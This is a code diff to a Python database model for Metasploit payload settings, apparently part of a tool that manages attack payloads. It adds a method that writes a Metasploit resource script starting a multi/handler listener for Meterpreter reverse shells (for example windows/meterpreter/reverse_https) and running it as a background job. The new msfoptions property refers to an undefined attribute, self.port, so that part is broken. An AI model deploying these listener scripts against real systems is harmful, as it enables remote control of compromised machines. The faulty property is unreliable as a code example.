@@ -11,14 +11,6 @@ from sqlalchemy import Column, ForeignKey
 from sqlalchemy.types import String, Integer
 from models.BaseObject import BaseObject
 
-RC_TEMPLATE = '''
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_https
-set LHOST 0.0.0.0
-set LPORT 4444
-set ExitOnSession false
-exploit -j
-'''
 
 class Payload(BaseObject):
     ''' Payload settings '''
@@ -27,21 +19,38 @@ class Payload(BaseObject):
         ForeignKey('user.id'), 
         nullable=False
     )
+    lhost = Column(String(256), default="0.0.0.0")
     lport = Column(Integer, default=4444)
-    lhost = Column(String(32), default="0.0.0.0")
-    rport = Column(Integer, default=4444)
-    rhost = Column(String(32))
-    msfpayload = Column(String(64))
-    msfoptions = Column(String(64))
-    download_url = Column(String(64))
-    protocol = Column(String(64))
+    msfpayload = Column(String(256))
+    url = Column(String(256))
+    protocol = Column(String(32))
+    cryptor = Column(String(32))
 
     @classmethod
     def by_id(cls, sid):
         return dbsession.query(cls).filter_by(id=sid).first()
 
+    @property
+    def msfoptions(self):
+        _msfoptions = []
+        _msfoptions.append("LHOST=%s" % self.lhost)
+        _msfoptions.append("LPORT=%d" % self.port)
+        return _msfoptions
+
     def generate_rc_file(self):
-        pass
+        return '''
+use exploit/multi/handler
+set PAYLOAD %s
+set LHOST %s
+set LPORT %d
+set ExitOnSession false
+exploit %s
+''' % (self.msfpayload, self.lhost, self.lport, self.exec_job())
+    
+    def exec_job(self):
+        return '-j' if 'reverse' in self.msfpayload else ''
 
     def __str__(self):
-    	return self.msfpayload
+    	return "Created: %s | MSFPayload: %s | Port: %d | Download: %s" % (
+            self.created, self.msfpayload, self.lport, self.url
+        )
